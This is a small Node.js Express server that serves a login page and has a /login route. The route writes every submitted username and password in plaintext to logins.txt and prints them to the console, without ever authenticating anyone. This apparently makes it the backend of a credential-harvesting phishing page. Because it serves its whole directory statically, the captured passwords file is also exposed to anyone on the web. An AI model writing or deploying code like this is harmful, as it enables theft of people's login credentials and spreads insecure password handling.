const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/main.css", (req, res) => {
  res.sendFile(path.join(__dirname, "main.css"));
});

app.get("/script.js", (req, res) => {
  res.sendFile(path.join(__dirname, "script.js"));
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("logins.txt", logEntry, (err) => {
    if (err) {
      console.error("Error saving login:", err);
      return res.status(500).send("Failed to save.");
    }
    console.log("Login saved:", logEntry.trim());
    res.send("Data received.");
  });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
